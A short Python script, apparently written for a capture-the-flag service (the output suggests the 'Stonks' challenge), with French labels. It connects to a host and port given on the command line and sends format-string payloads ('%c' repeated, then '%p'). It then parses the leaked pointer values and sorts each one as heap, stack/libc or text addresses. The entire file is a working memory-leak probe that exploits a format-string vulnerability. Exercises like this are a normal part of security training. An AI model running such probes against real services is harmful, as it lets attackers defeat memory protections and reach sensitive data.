import socket, re, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
KMAX = int(sys.argv[3]) if len(sys.argv) > 3 else 16


def probe(k):
    payload = ("%c" * k + "%p").encode()
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(4)
    time.sleep(0.25)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"1\n")
    time.sleep(0.35)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            out += d
            if len(out) > 8000:
                break
    except Exception:
        pass
    s.close()
    seg = out.split(b"Buying stonks with token:")[-1]
    m = re.search(rb"0x[0-9a-f]+|\(nil\)", seg)
    return m.group(0).decode() if m else "(rien)"


print("rang | valeur                | note")
for k in range(KMAX):
    v = probe(k)
    note = ""
    try:
        x = int(v, 16)
        if x < 0x100000000 and x > 0x1000000:
            note = "HEAP?"
        elif 0x7f0000000000 <= x < 0x800000000000:
            note = "STACK/libc"
        elif 0x400000 <= x < 0x402000:
            note = "TEXTE/.rodata"
    except Exception:
        pass
    print("%4d | %-21s | %s" % (k + 1, v, note))
